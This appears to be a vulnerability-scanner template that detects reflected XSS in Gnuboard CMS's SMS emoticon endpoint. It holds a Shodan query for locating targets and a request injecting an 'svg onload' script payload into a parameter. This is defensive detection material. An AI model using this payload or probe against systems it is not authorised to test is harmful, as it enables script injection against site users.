id: gnuboard-sms-xss
info:
  author: gy741
  description: A vulnerability in Gnuboard CMS allows remote attackers to inject arbitrary
    Javascript into the responses returned by the server.
  metadata:
    shodan-query: http.html:"Gnuboard"
    verified: true
  name: Gnuboard CMS - SMS Emoticon XSS
  reference:
  - https://sir.kr/g5_pds/4788?page=5
  - https://github.com/gnuboard/gnuboard5/commit/8182cac90d2ee2f9da06469ecba759170e782ee3
  severity: medium
  tags: xss,gnuboard
requests:
- matchers:
  - part: body
    type: word
    words:
    - '"0nuboard<svg onload=alert(document.domain)>"'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>'
